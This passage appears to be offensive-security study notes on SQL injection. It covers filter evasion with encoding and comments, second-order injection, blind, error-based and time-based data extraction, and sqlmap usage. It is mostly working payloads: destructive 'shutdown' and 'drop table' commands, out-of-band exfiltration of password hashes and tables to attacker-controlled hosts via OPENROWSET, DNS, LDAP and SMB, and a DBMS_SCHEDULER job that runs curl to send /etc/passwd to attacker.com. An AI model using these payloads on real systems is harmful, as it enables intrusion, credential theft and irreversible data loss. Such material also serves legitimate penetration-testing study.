- Percent-encoding allows you to represent characters in a way that doesn’t directly match the original string, helping you evade basic filters. This technique is especially useful when the application is not properly decoding the input before executing the query.

- Double percent-encoding is often used to further complicate the injection and is effective against filters that decode the input only once. It’s a trick that requires the target system to decode multiple layers.

2. 2. Using SQL Comments for Bypassing Filters:

SQL comments can be incredibly useful when bypassing input validation that strips out spaces or other characters. By embedding comments, you can simulate whitespace, allowing you to break up or hide malicious parts of your query without breaking the syntax. There are two main types of SQL comments:

- Single-line comments using ```--```:

```
SELECT username, password FROM users -- bypass filter
```

- Multi-line comments using ```/*...*/```:

```
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
```

In the example above, if the application strips spaces or certain characters from the input, the comment ```/*foo*/``` can act as a substitute for the spaces that would normally be between keywords or identifiers in the query. This allows you to bypass filters while maintaining the integrity of the SQL syntax.

**MySQL Specific Comment Bypassing:**

In MySQL, comments can even be inserted within SQL keywords themselves, providing another layer of obfuscation and a means to bypass input validation. For example:

```
SEL/*foo*/ECT username, password FR/*foo*/OM users
```

In this query:

- The comment ```/*foo*/``` is inserted inside the ```SELECT``` and ```FROM``` keywords.

- The SQL engine ignores the comment but still recognizes the rest of the keyword, allowing the query to function normally.

Let’s compare these commented queries to their plaintext (unobfuscated) counterparts to see how they function:

- Plaintext query (without comments):

```
SELECT username, password FROM users
```

- Obfuscated query with comments:

```
SELECT/*foo*/username, password/*foo*/FROM/*foo*/users
```

Both queries are syntactically the same from the perspective of the SQL engine, but the second one uses comments to bypass filters that might block spaces or certain characters. When dealing with simple input validation that uses blacklists, always think about how you can manipulate or encode the input to make it unrecognizable to the filter but still executable by the SQL engine. Using encoding tricks and SQL comments can be powerful ways to bypass input validation without triggering alarms.

**Additional Notes and Thoughts:**

The concept of using encoding and comments to bypass filters isn't just confined to SQL injection—it's a broader technique that can be adapted to other areas of exploitation as well.

1. **Null Byte Trick:** While this technique is often associated with SQL injection, it's also relevant in other contexts, such as **file path manipulation**. For example, when working with web servers or systems that process file names or paths, a null byte can terminate a string early, causing the application to misinterpret the file name and potentially bypass security checks.

2. **Base64 Encoding:** Base64 encoding is a great example of obfuscation that works across various attack vectors. When you're dealing with PowerShell payloads, SSTI (Server-Side Template Injection), or even XSS (Cross-Site Scripting), encoding payloads in Base64 allows you to evade input filters that block certain characters, like angle brackets (```< >```) or script tags. The payload looks harmless until decoded by the system, at which point it executes. It’s similar to how you might inject encoded characters into a SQL query to evade blacklisting.

- **PowerShell Reverse Shells:** Often, when you're sending PowerShell payloads, they might be blocked by filters looking for ```Invoke-Expression``` or ```iex```. By encoding the payload in Base64, you can bypass these filters and have PowerShell decode and execute it on the target machine.

- **SSTI:** With SSTI, you can encode your payload in Base64 to avoid triggering the filters while injecting template code that will get evaluated by the server when decoded.

3. **Comments in Injection Attacks:** In SSTI, command injection, and XPath injection, comments can also play a role in obfuscating payloads. For instance:

- In command injection, you could use comments to break up the payload into parts that look like harmless text or to hide parts of the attack from input filters.

- For XPath injection, comments can be used to disrupt the structure of a query while still allowing the attack to succeed. XPath injection aims to manipulate the structure of an XPath query, often to retrieve unauthorized data from an XML document or database. By injecting malicious input into an XPath expression, an attacker can bypass authentication, access sensitive information, or alter the query’s logic to their advantage. It's essentially about exploiting the logic of the XML querying process.

#### Second-Order SQL Injection:

A particularly intriguing type of SQL injection is second-order SQL injection. Unlike traditional SQL injection, where malicious input is executed immediately, second-order injection occurs when seemingly safe input is stored in the database and later processed in an unsafe way—either by the application itself or another back-end process. These secondary processes often run with high-privileged database accounts, making this an effective attack vector.

Many applications validate user input when it first arrives, such as escaping single quotes. For instance, consider a book search feature where a user inputs the term ```O'Reilly```. To prevent SQL injection, the application converts the input into:

```
SELECT author, title, year FROM books WHERE publisher = 'O''Reilly'
```

Here, the single quote (```'```) has been doubled up (```''```), preserving its literal meaning and preventing immediate SQL injection.

However, problems arise when the same input is later reused in another SQL query. This is because the doubling-up of quotes applies only when initially inserting the data into the database. If the application later retrieves this data and embeds it into a query without re-escaping it, the original single quote becomes active again, leading to SQL injection.

**Boundary Validation vs. Simple Escaping:**

This demonstrates the shortcomings of simple escaping versus true boundary validation. Simple escaping modifies input at the time of storage but fails when the data is later reinterpreted. Boundary validation, in contrast, ensures that data is correctly handled throughout its lifecycle, preventing it from ever being executed as code.

Consider an application where users can self-register. The username is stored in the database using a query like:

```
INSERT INTO users (username, password, ID, privs) VALUES ('foo''', 'secret', 2248, 1)
```

At first, this seems secure, as the single quote is escaped. However, suppose the application later allows users to change their password by first retrieving their stored username and then constructing a query:

```
SELECT password FROM users WHERE username = 'foo'''
```

**Note on How Escaping Works::**

- Databases typically escape single quotes by doubling them (```''```).

- If the username ```foo'``` is entered, it is stored as ```foo''```, preserving its original meaning when retrieved later.

Since the stored username already contains an embedded quote (```foo'```), this results in an unclosed string, breaking the query and potentially allowing injection. In other words, the third single quote is unintended and causes a syntax error, as SQL expects pairs of quotes.

An attacker can register a username with a crafted SQL payload, such as:

```
' or 1 in (select password from users where username='admin
```

During registration, this input is stored safely in the database. However, when the application later constructs a query using this stored username, it results in:

```
SELECT password FROM users WHERE username = '' or 1 in (select password from users where username='admin'
```

This effectively turns the query into a **subquery that leaks the admin's password**. The database might return an error message like:

```
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value 'fme69' to a column of data type int.
```

This error accidentally discloses the admin password (```fme69```), allowing the attacker to compromise the account.

**Additional Notes:** 

- The attacker attempts to inject a condition into the SQL query. If the query is:

```
SELECT * FROM users WHERE username = ''
```

An attacker can inject:

```
' OR 1 IN (SELECT password FROM users WHERE username = 'admin
```

Since this input lacks a proper closing quote, it **breaks the syntax**, unless the application mishandles it. If a system only escapes the quote when first storing the input but does not sanitize it on retrieval, an attacker can store malicious input that later executes an injection when reused elsewhere in a query.

**Key Points:**

- In SQL, single quotes (```'```) are used to denote string literals. If a user input contains a single quote, it can break the intended query structure and lead to SQL injection if not properly handled.

- Second-order SQL injection exploits unsafe processing of previously stored data.

- Escaping input on insertion is insufficient—queries must be handled safely throughout their lifecycle.

- Applications should always use parameterized queries instead of concatenating stored values into new SQL statements.

- Attackers can abuse this by injecting payloads during registration and triggering them later during other operations like login or password reset.

### Advanced Exploitation in SQL Injection:

This section deals with retrieving data in difficult scenarios where the usual techniques (like ```UNION SELECT``` or error-based SQLi) might not work. It also covers destructive queries and numeric data extraction.

**Destructive SQL Injection:**

```
shutdown--
```

- The ```shutdown``` command immediately turns off an MS-SQL database. The ```--``` turns the rest of the SQL statement into a comment, preventing syntax errors.

Similarly, we can use:

```
drop table users--
drop table accounts--
drop table customers--
```

- These commands permanently delete entire database tables, causing massive data loss. If the attacker has privileges to execute these commands, the damage is irreversible.

**Extracting Data as Numbers (Bypassing Single Quote Restrictions):**

If an application only allows numbers in input fields (e.g., ```id=1337```), but is still vulnerable to SQL injection, how do you extract text data?

1. Extracting One Character:

If we attempt to extract ```"Admin"```, we use ```substring()``` to **cut one letter at a time:**

```
substring('Admin',1,1)
```

Breakdown:

- ```"Admin"``` → our target string.

- ```1``` → start at the **first character**.

- 1 → extract **only one character**.

- Output: ```'A'```

**Additional notes:**

The two integers in ```substring('Admin',1,1)``` are not to be confused with "start" and "stop" parameters, but rather:

- Start Position – Where to begin extracting characters (1-based index).

- Length – How many characters to extract. So in this case:

```
substring('Admin',1,1)
```

- Start at position ```1``` (the letter ```'A'```).

- Extract ```1``` character (```'A'```).

If you change it to:

```
substring('Admin',2,3)
```

- Start at position ```2``` (the letter ```'d'```).

- Extract ```3``` characters (```'dmi'```).

It's subtly different from Python, where you'd use ```string[start:stop]```. Instead, SQL expects the second number to be the number of characters to extract, not the stopping index.

2. Converting Characters to ASCII:

To extract data numerically, we use ```ascii()```:

```
ascii('A')
```

What it does:

- Converts ```'A'``` into its ASCII numeric value:

```
A → 65
```

- This means instead of returning ```'A'```, we return ```65```, which bypasses character restrictions.

3. Combining ```substring()``` and ```ascii()```:

```
ascii(substring('Admin',1,1))
```

Breakdown:

- ```substring('Admin',1,1)``` → extracts the first letter ```'A'```.

- ```ascii('A')``` → converts ```'A'``` into ```65```.

- Final Output: ```65```

**Automating the Extraction Process:**

To extract the entire string one letter at a time:

```
ascii(substring((SELECT password FROM users LIMIT 1), 1, 1))
ascii(substring((SELECT password FROM users LIMIT 1), 2, 1))
ascii(substring((SELECT password FROM users LIMIT 1), 3, 1))
```

This retrieves:

- First character (```A``` → ```65```)

- Second character (```d``` → ```100```)

- Third character (```m``` → ```109```) … and so on.

This can be ```scripted``` using tools like sqlmap or automated via a loop.

4. Extracting Data via Numeric Identifiers:

Some applications don’t return raw numbers but instead return a resource based on that number (e.g., a document ID). Example Scenario:

A web app has a URL:

```
https://example.com/document?id=1234
```

If we inject:

```
id= (SELECT ascii(substring(password,1,1)) FROM users)
```

Instead of returning ```65```, the app retrieves a document with ID 65. The attacker then maps document contents to ASCII values and reconstructs the data.

### Using an Out-of-Band Channel:

In some cases, injected queries execute, but their results are not returned to the attacker. This may occur when applications do not return error messages or query results in responses. However, alternative techniques can still retrieve data.

**Example of Subquery Injection:**

Given a vulnerable login query:

```
SELECT * FROM users WHERE username = 'marcus' AND password = 'secret'
```

An attacker may inject a separate subquery using string concatenation:

```
' || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP')
```

Resulting in:

```
SELECT * FROM users WHERE username = 'foo' || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP')
```

- ```DUAL``` is a dummy table in Oracle used for evaluation.

- ```all_users``` lists all usernames in the database.

- If ```DBSNMP``` exists, ```1``` is concatenated to the username field.

- Although the login will fail, this confirms ```DBSNMP``` is a valid username.

Batch queries (in MS-SQL) allow execution of multiple separate SQL statements in a single request. However, their results are not returned to the attacker. Instead, an alternative retrieval method is needed. If arbitrary SQL execution is possible, the attacker can use built-in database features to send query results to an external server. This method depends on the database type and the privileges available to the application's database user.

#### MS-SQL:

**OpenRowSet for Out-of-Band Exfiltration:**

```
INSERT INTO OPENROWSET('SQLNCLI', 'Server=mdattacker.net;Uid=sa;Pwd=letmein;',
'SELECT * FROM foo') VALUES (@@VERSION)
```

- Port 80 increases the chance of an outbound connection since web traffic is typically allowed.

#### Oracle:

**utl_http for HTTP Exfiltration:**

```
/employees.asp?EmpNo=7521'||UTL_INADDR.GET_HOST_NAME(
(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME='SYS') || '.mdattacker.net')
```

- The attacker controls ```mdattacker.net```, so when the database resolves a DNS query, the password hash is embedded in the request. Even if HTTP is blocked, DNS traffic is often allowed, making it an effective exfiltration method. This technique is very similar to DNS-based exfiltration seen in Log4j exploits.

**Using ```DBMS_LDAP.INIT``` for Exfiltration:**

```
SYS.DBMS_LDAP.INIT(
(SELECT PASSWORD FROM SYS.USER$ WHERE NAME='SYS') || '.mdsec.net', 80)
```

- ```DBMS_LDAP.INIT``` is normally used for LDAP lookups. It is abused here to send sensitive data to a rogue LDAP server.

#### MySQL:

**Writing Data to an SMB Share with ```SELECT ... INTO OUTFILE```:**

```
SELECT * INTO OUTFILE '\\\\mdattacker.net\\share\\output.txt' FROM users;
```

- The ```\\\\``` is correct in MySQL because it follows Windows UNC (Universal Naming Convention) paths. This will create ```output.txt``` on ```mdattacker.net``` under the share ```share```.

- The attacker's machine must have a writable anonymous SMB share. This is often blocked in modern systems due to SMB security hardening.

**Additional Notes:**

1. MS-SQL:

- ```OPENROWSET``` and ```OPENDATASOURCE``` are often disabled by default in newer versions (post-2016).

- ```xp_cmdshell``` can sometimes be enabled for remote exfiltration using ```curl``` or ```powershell```.

2. Oracle:

- Many methods (```utl_http```, ```utl_inaddr```, ```utl_smtp```, ```DBMS_LDAP```) are blocked in modern Oracle versions via Access Control Lists (ACLs).

- Bypassing ACLs requires higher privileges or using whitelisted functions like ```dbms_scheduler``` for network access. If ACLs block direct network access, you can use the ```dbms_scheduler``` package to create a scheduled job that executes an external shell command (e.g., curl, nc, or wget) for exfiltration. Example:

```
BEGIN
  DBMS_SCHEDULER.create_job (
    job_name        => 'EXFIL_JOB',
    job_type        => 'EXECUTABLE',
    job_action      => '/bin/bash -c "curl -X POST -d @/etc/passwd http://attacker.com/exfil"',
    enabled         => TRUE
  );
END;
/
```

This assumes you have sufficient privileges to create a job. If execution fails, try escalating privileges via ```DBA_SCHEDULER_JOBS``` leaks or abusing a misconfigured job.

3. MySQL:

- Modern defenses: ```secure_file_priv``` prevents writing to arbitrary locations.

- Alternative exfiltration: Using ```LOAD DATA LOCAL INFILE``` with a controlled ```FILE``` parameter. MySQL allows loading data from a client machine using ```LOAD DATA LOCAL INFILE```, which can be abused to leak local files from the victim’s system.

- If a web application allows user-controlled input for ```FILE```, an attacker can make the database server read and send sensitive files. Example:

```
LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE users
FIELDS TERMINATED BY ','
LINES TERMINATED BY '\n';
```

- If ```LOCAL INFILE``` is disabled: You may need to enable it by starting MySQL with ```--local-infile=1``` or modifying ```my.cnf```. Alternative: Writing Exfiltrated Data to an Attacker-Controlled SMB Share:

```
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\dump.txt'
FIELDS TERMINATED BY ',' LINES TERMINATED BY '\n'
FROM sensitive_table;
```

The SMB server must allow anonymous write access. Wireshark or ```tcpdump``` can be used to verify outbound connections.

### SQL Injection via Inference (Blind SQL Injection):

This technique is all about extracting data when direct results aren’t available. Instead of seeing actual query results, you rely on true/false conditions to infer the correct data.

**The Core Idea:**

You inject SQL conditions into an application and observe its behavior:

- If true, the app behaves normally (e.g., logs in successfully).

- If false, the app does something different (e.g., login fails).

This allows you to brute-force extract data one character at a time.

**Breaking Down the Queries:**

1. Basic Boolean Injection:

A normal vulnerable login query might look like this:

```
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```

Now, let's inject some SQL:

```
admin' AND 1=1--  
```

- This always evaluates to true, logging you in as "admin." The ```--``` comments out the rest of the query, ensuring no syntax errors.

And now the variation:

```
admin' AND 1=2--  
```

- This always evaluates to false, causing login failure. Since 1=2 is false, no rows are returned. This proves we can modify the logic and control the query’s behavior.

2. Extracting Data with ASCII and SUBSTRING:

Once you confirm injection works, you can start extracting hidden data. Example Query:

```
admin' AND ASCII(SUBSTRING('Admin',1,1)) = 65--  
```

Breaking it down:

- ```SUBSTRING('Admin', 1, 1)``` → Extracts the first character (```'A'```).

- ```ASCII('A')``` = ```65``` → Converts ```'A'``` to its ASCII code.

**Condition: ```ASCII(...) = 65```:**

- If true, login succeeds (meaning the first letter is 'A'). If false, login fails.

Another Test Case:

```
admin' AND ASCII(SUBSTRING('Admin',1,1)) = 66--  
```

- ```66``` is ASCII for ```'B'``` → Since ```'Admin'``` starts with ```'A'```, this condition fails (login denied).

You repeat this process for each position in the string:

```
admin' AND ASCII(SUBSTRING('Admin',2,1)) = 100--  -- Checks if the second letter is 'd'
admin' AND ASCII(SUBSTRING('Admin',3,1)) = 109--  -- Checks if the third letter is 'm'
...
```

By cycling through all ASCII values (0-255), you can brute-force extract the entire password or any other hidden data.

**How Does SQLMap Use This?**

Instead of manually guessing ASCII codes, SQLMap automates the process by:

1. Detecting a true/false injection point.

2. Iterating through ASCII values to reconstruct each character.

3. Repeating for the entire string until full extraction.

Blind SQLi is slower than regular SQLi because it requires multiple requests per character. It works even when direct output is blocked (e.g., no error messages, no database dump). Understanding ASCII-based extraction is crucial for crafting manual SQLi attacks.

### Inducing Conditional Errors in SQL Injection:

Not all SQL injection attacks result in immediately noticeable effects, like logging into an admin account. In some cases, you might inject into a background process, such as a logging mechanism, where no visible feedback is given. In other situations, your injected query might be inside a subquery or part of a batched statement, meaning the application never displays the result.

To overcome this challenge, David Litchfield developed a method where attackers can **deliberately trigger a database error based on a condition**, allowing them to infer information without direct data retrieval.

Databases **only evaluate expressions when necessary**. For example, take the following query:

```
SELECT column_name FROM table_name WHERE condition;
```

The database processes each row in ```table_name```, checks ```condition```, and only returns ```column_name``` if the condition is met. If ```condition``` is never true, the column expression is never evaluated. **This short-circuiting behavior is key to inducing errors deliberately.**

To exploit this, we need a **syntactically valid SQL expression that causes an error when evaluated.** A classic example is division by zero (1/0), which is **mathematically undefined** and will cause an error in databases like Oracle and MS SQL.

- If the condition is **true**, the division by zero occurs, and an error is triggered.

- If the condition is **false**, the division never happens, so the query executes without error.

**Example: Checking If a User Exists (Oracle/MS SQL):**

You want to check if a specific database user (```DBSNMP```) exists in Oracle's system tables. Exploit Query:

```
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP';
```

Breakdown:

1. ```(SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP'```

- This checks if the username ```DBSNMP``` exists in the ```all_users``` table.

- If the username exists, the condition evaluates to ```TRUE```.

- If it doesn’t exist, the condition is ```FALSE```, and the division never happens.

2. ```1/0``` causes an error only when the condition is ```TRUE```.

- If ```DBSNMP``` exists → Error occurs.

- If ```DBSNMP``` does not exist → No error.

3. Error Presence = Information Leak

- If the database throws an error, we now know ```DBSNMP``` exists.

- If no error occurs, ```DBSNMP``` doesn’t exist.

**Testing a Nonexistent User (No Error):**

```
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'AAAAAA') = 'AAAAAA';
```

Since ```AAAAAA``` doesn’t exist in the database, the **WHERE condition is always false**, meaning ```1/0``` never executes, and no error is thrown.

Another example:

```
(SELECT 1 WHERE (SELECT COUNT(*) FROM users) > 10 OR 1/0=0);
```

Here, the error occurs **only if there are more than 10 users in the database.**

Breakdown:

**Step 1:** Evaluate the Subquery:

```
(SELECT COUNT(*) FROM users) > 10
```

- The database first executes the subquery ```SELECT COUNT(*) FROM users```, which counts the number of rows in the ```users``` table. The result (let's say it's 15) is compared against 10, returning TRUE.

**Step 2:** Short-Circuit Evaluation with OR:

- The ```OR``` operator ensures that if the first condition is ```TRUE```, the second part (```1/0=0```) is never evaluated. Since ```COUNT(*) FROM users > 10``` is TRUE, the ```1/0``` division never happens, and no error is triggered.

What if ```COUNT(*) FROM users``` is 5?

- The first condition (```5 > 10```) evaluates to FALSE. The database must then evaluate ```1/0=0```, which triggers a division-by-zero error.

This technique exploits the way SQL engines evaluate **logical conditions in WHERE clauses**. The database will **only execute the necessary conditions**, making it possible to use errors as a form of **Boolean inference.**

**Analogy to Debugging (for Extra Clarity):**

This technique is similar to debugging with exceptions in programming. Imagine a program where you want to check if a certain variable is set. Instead of printing the variable, you force a crash if it exists:

```
if username == "admin":
    raise Exception("Boom!")
```

- If the program crashes, you know ```"admin"``` exists.

- If it runs fine, ```"admin"``` is not present.

This is exactly what we’re doing with SQL errors—forcing a crash when the target condition is met.

**Other Databases?**

While the division by zero trick works in Oracle and MS SQL, other databases might require a different approach. Examples:

1. MySQL & PostgreSQL: You can use ```LENGTH()``` on ```NULL```, which causes an error:

```
SELECT 1 WHERE (SELECT COUNT(*) FROM users) > 10 OR LENGTH(NULL) > 0;
```

- ```LENGTH(NULL)``` in MySQL & PostgreSQL throws an error, because ```NULL``` has no length.

- If ```COUNT(*) FROM users > 10``` is TRUE, the error is avoided (short-circuiting).

- If ```COUNT(*) FROM users <= 10```, then ```LENGTH(NULL) > 0``` is evaluated, triggering an error.

2. SQLite: ```CAST('text' AS INTEGER)``` can cause type conversion errors:

```
SELECT 1 WHERE (SELECT COUNT(*) FROM users) > 10 OR CAST('text' AS INTEGER) > 0;
```

- ```CAST('text' AS INTEGER)``` fails in SQLite because the string ```'text'``` cannot be converted into a valid integer.

- If ```COUNT(*) FROM users > 10```, the error never occurs. Otherwise, it forces the ```CAST``` operation, triggering an error.

- The ```CAST()``` function in SQL **converts a value from one data type to another.** It's used when you need to **force** a specific data type on a value, but if the conversion is invalid, it can cause an error (which is why it's useful for conditional errors in SQL injection).

Example Usages of ```CAST()```:

1. Valid Conversion (Works Fine):

```
SELECT CAST('123' AS INTEGER); -- Converts string '123' to an integer (123)
```

2. Invalid Conversion (Causes Error in SQLite):

```
SELECT CAST('hello' AS INTEGER);
```

3. MySQL & PostgreSQL Behavior:

```
SELECT CAST('hello' AS SIGNED); -- Returns 0 instead of an error
```

MySQL: Instead of throwing an error, it usually converts invalid text to 0.

PostgreSQL: It will reject invalid conversions and throw an error, just like SQLite.

#### Understanding the Query and the Injection Point:

Consider an application that provides a searchable and sortable contacts database. The user controls two parameters:

```
/search.jsp?department=30&sort=ename
```

This results in the following back-end SQL query:

```
String queryText = "SELECT ename, job, deptno, hiredate FROM emp 
WHERE deptno = ? 
ORDER BY " + request.getParameter("sort") + " DESC";
```

Breakdown:

- ```deptno = ?``` → This is a **parameterized query**, meaning user input is safely inserted as a value, preventing direct injection into the ```WHERE``` clause.

- ```ORDER BY " + request.getParameter("sort")``` → This is **concatenation of unsanitized user input**, making the sort parameter vulnerable to SQL injection.

- Since ```ORDER BY``` **does not** allow ```UNION``` queries, an attacker must exploit conditional errors instead.

The attacker submits:

```
/search.jsp?department=20&sort=
(select%201/0%20from%20dual%20where%20
(select%20substr(max(object_name),1,1)%20FROM%20user_objects)='Y')
```

Deobfuscating the SQL Injection Payload from above:

```
SELECT 1/0 FROM dual 
WHERE (SELECT SUBSTR(MAX(object_name),1,1) FROM user_objects) = 'Y'
```

Breakdown:

- ```SELECT 1/0``` → Intentional divide-by-zero error. If evaluated, it will cause a database error.

- ```FROM dual``` → Dummy table in Oracle used for single-row operations.

- ```WHERE (SELECT SUBSTR(MAX(object_name),1,1) FROM user_objects) = 'Y'```:

```SELECT MAX(object_name) FROM user_objects``` → Fetches the last object name in alphabetical order.

```SUBSTR(...,1,1)``` → Extracts the first letter of that name.

```= 'Y' → If the letter is 'Y'```, the condition becomes true, triggering division by zero.

Impact:

- If the condition is true (```'Y'``` is the first letter of the max object name), an error occurs, and the query fails.

- If false, the error does not trigger, and results are returned normally. This allows step-by-step inference of database contents by observing the presence or absence of errors.

#### Automating the Attack Using SQLmap:

SQLmap can be used to automate this process. Here’s an example of how to test for this vulnerability:

```
sqlmap -u "http://target.com/search.jsp?department=20&sort=*" --dbms=Oracle --level=5 --risk=3 --technique=E --string="No error"
```

- ```-u "http://target.com/search.jsp?department=20&sort=*"``` → Specifies the URL and injection point (```*``` will be replaced by SQLmap).

- ```--dbms=Oracle``` → Targets Oracle.

- ```--level=5 --risk=3``` → Enables advanced techniques.

- ```--technique=E``` → Uses error-based SQL injection.

- ```--string="No error"``` → Defines a string that confirms when the injection does not trigger an error, allowing inference. The ```--string="No error"``` option in SQLmap is used for **blind SQL injection** to detect when a condition is true. Essentially, you need to specify a string that only appears in the HTTP response when the injected condition does not trigger an error.

How do we find this string?

1. Baseline Request: Perform a normal request without injection and note the response.

2. Intentional Error: Inject something invalid (```1/0``` or ```'``` to break the query) and check if the error changes the response.

3. Identify a Stable Marker: Find a piece of text that appears only when no error occurs—this could be a status message, a table header, or a specific phrase in the response. If you’re unsure, you can start by running SQLmap without ```--string``` and manually inspecting responses in verbose mode (```-v 3``` or higher).

**Alternative Error-Based Queries for Different Databases:**

- MySQL: ```SELECT LENGTH(NULL);```

- PostgreSQL: ```SELECT LENGTH(NULL);```

- SQLite: ```SELECT CAST('text' AS INTEGER);```

### Time-Based SQL Injection:

Time-based SQL injection is useful when:

- The application does not return query results.

- Error messages are suppressed.

- Out-of-band methods (like DNS exfiltration) are unavailable.

By leveraging time delays, an attacker can extract one bit of information at a time—like playing 20 Questions but with a database. Six examples are shown here:

1. **MS-SQL ```WAITFOR DELAY```:**

```
IF (SELECT USER) = 'sa' WAITFOR DELAY '0:0:5'
```

Logic:

- If the current DB user is ```sa```, the query pauses for 5 seconds.

- Usage: Used for boolean-based extraction, where a delay means “yes” and no delay means “no.”

2. **Extracting Data Character-by-Character:**

```
IF ASCII(SUBSTRING('Admin',1,1)) = 64 WAITFOR DELAY '0:0:5'
IF ASCII(SUBSTRING('Admin',1,1)) = 65 WAITFOR DELAY '0:0:5'
```

Logic:

- ```SUBSTRING('Admin',1,1)```: Extracts the first letter (```‘A’```).

- ```ASCII(...)```: Converts the letter into its ASCII value (```65``` for ```'A'```).

- If it matches, the DB waits 5 seconds, revealing that the letter is ```‘A’```.

- The attacker loops all possible values (A-Z, a-z, 0-9) until a delay is triggered.

3. **Extracting Bits Instead of Full Characters:**

```
IF (ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,0))) > 0 WAITFOR DELAY '0:0:5'
```

Logic:

- Instead of checking the entire ASCII value, we check each bit.

- ```POWER(2,0)```: Tests the first bit of the letter’s ASCII value. If the bit is ```1```, it triggers the delay. Advantage: Speeds up extraction, reducing the number of queries.

Additional Notes:

```SUBSTRING('Admin',1,1)``` → Extracts the first character, which is ```'A'```.

```ASCII('A')``` → Converts ```'A'``` to its ASCII value (which is ```65```).

```POWER(2,0)``` → Computes ```2^0 = 1```.

```ASCII('A') & 1``` → Performs a bitwise AND operation between ```65``` (```1000001``` in binary) and ```1``` (```0000001```).

```1000001 & 0000001 = 0000001``` → Result is ```1``` (true).

```IF (1 > 0) WAITFOR DELAY '0:0:5'``` → Since 1 is greater than 0, the server waits 5 seconds.

So, the execution order is: 1: Extract substring, 2: Convert to ASCII, 3: Compute power, 4: Perform bitwise AND, 5: Compare result with 0, 6: Apply ```WAITFOR DELAY``` if condition is met.

And now the second variation of this example:

```
IF (ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,1))) > 0 WAITFOR DELAY '0:0:5'
```

- This checks the second bit, repeating for all bits until the letter is fully reconstructed.

4. **MySQL ```SLEEP()```:**

```
SELECT IF(USER() LIKE 'root@%', SLEEP(5), 'false')
```

Logic:

- Checks if the DB user is root. If true, it pauses for 5 seconds. Usage: Boolean-based inference in MySQL 5.0.12+.

Additional Notes:

In MySQL, the ```USER()``` function returns the current user in the format:

```
'username@host'
```

The ```LIKE 'root@%'``` pattern means:

```'root@%'``` → Match any user named root connecting from any host (```%``` is a wildcard). This is useful because MySQL allows users with different host specifications, e.g., ```root@localhost``` and ```root@192.168.%``` are different users.

Older MySQL (Pre-5.0.12): ```BENCHMARK()``` Workaround:

```
SELECT IF(USER() LIKE 'root@%', BENCHMARK(50000, SHA1('test')), 'false')
```

Logic:

- ```BENCHMARK(50000, SHA1('test'))```: Runs SHA1 hashing 50,000 times, causing a measurable delay.

- If the condition (```USER() LIKE 'root@%'```) is true, the delay is triggered. Usage: Older MySQL versions without ```SLEEP()```.

5. **PostgreSQL ```pg_sleep():```**

```
SELECT pg_sleep(5) WHERE (SELECT current_user) = 'postgres'
```

Logic:

- Delays execution only if the DB user is ```postgres```.

6. **Oracle ```UTL_HTTP.request()```:**

Oracle lacks a direct ```SLEEP``` function, but we can force a timeout:

```
SELECT 'a' || UTL_HTTP.REQUEST('http://madeupserver.com') FROM dual
```

Logic:

- The DB tries to connect to a nonexistent server. The request times out, causing a delay.

Conditional Time Delay in Oracle:

```
SELECT 'a' || UTL_HTTP.REQUEST('http://madeupserver.com')
FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP'
```

Logic:

- Checks if the ```DBSNMP``` user exists. If it does, it triggers a timeout via ```UTL_HTTP.REQUEST()```. Otherwise, it executes instantly.

- In Oracle SQL, ```||``` is string concatenation, **NOT an AND** operator!

Additional Notes:

```(SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP'```: Checks if the user ```DBSNMP``` exists.

If the condition is true, Oracle executes: ```UTL_HTTP.REQUEST('http://madeupserver.com')``` → Attempts an HTTP request (which fails).

```'a' || UTL_HTTP.REQUEST(...)``` → Tries to concatenate the letter ```'a'``` with the response of ```UTL_HTTP.REQUEST()```.

Oracle returns an error because the server doesn’t exist → This causes the delay. So the ```||``` operator is just forcing a string operation, and the delay is an unintended side effect of the request timing out.

**Key Points:**

Time-based injections work even if errors are hidden and responses don’t change. Binary-based extraction (checking bits instead of full characters) optimizes the attack. Different DBMSes have different time delay methods, so the approach varies.

Time-delay techniques can be immensely useful, not only for extracting sensitive information but also for detecting SQL injection vulnerabilities in the first place. This is especially relevant in cases of completely blind SQL injection, where no results are returned to the browser, and errors are silently handled. In such scenarios, standard detection methods that rely on crafted input often fail.

Using time delays is one of the most reliable ways to determine whether a parameter is vulnerable. If the back-end database is MS-SQL, the following payloads can be injected into each request parameter individually to monitor for extended response times, indicating a potential vulnerability:

```
waitfor delay '0:30:0'--  
waitfor delay '0:30:0'--1  
```

Here’s an example of how an attacker might inject this into a vulnerable SQL query:

```
SELECT * FROM users WHERE username = 'admin' AND password = 'password' OR 1=1; waitfor delay '0:30:0'--'
```

If the response time is significantly slower than usual, this strongly suggests that SQL injection is possible. The attacker can then proceed with more targeted exploitation techniques to extract data.

### Beyond SQL Injection: Escalating the Database Attack:

A successful SQL injection attack often results in total compromise of the application's database. Many applications use a single database account for all queries, relying solely on application-layer controls to manage user access. If an attacker gains unrestricted access to this database account, they effectively control all the application's data.

You might think that owning all the data is the end goal of a SQL injection attack. However, there are many reasons to escalate the attack further—either by exploiting vulnerabilities within the database itself or leveraging its built-in functionality for deeper control. Some key ways an attacker can escalate include:

- **Accessing Other Applications' Data:** If multiple applications share the same database, privilege escalation within the database could allow access to data from other applications.

- **Compromising the Operating System:** Many databases have functions that allow interaction with the underlying operating system. An attacker with the right privileges may be able to execute OS commands, upload malicious scripts, or even escalate to root/system-level access.

- **Gaining Network Access to Other Systems:** The database server often resides in a protected network zone, behind multiple security layers. Once inside, an attacker might find themselves in a trusted position, able to reach other critical servers that would otherwise be inaccessible.

- **Exfiltrating Data via Outbound Connections:** Attackers can exploit database networking functions to make outbound connections, sending stolen data directly to their own servers while bypassing application-level security controls and some intrusion detection systems (IDS).

